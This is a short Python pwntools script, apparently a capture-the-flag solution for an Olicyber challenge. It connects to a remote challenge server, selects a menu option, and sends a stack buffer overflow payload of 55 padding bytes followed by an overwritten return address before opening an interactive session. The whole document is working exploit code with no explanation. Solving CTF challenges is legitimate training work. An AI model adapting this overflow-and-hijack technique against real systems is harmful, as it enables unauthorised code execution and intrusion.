from pwn import *
r = remote("moreprivateclub.challs.olicyber.it", 10016)
r.recv(100)
r.sendline(b"7")
r.recv(100)
r.sendline(b"a"*55 + b"\xce\x12\x40\x00\x00\x00\x00\x00")
r.interactive()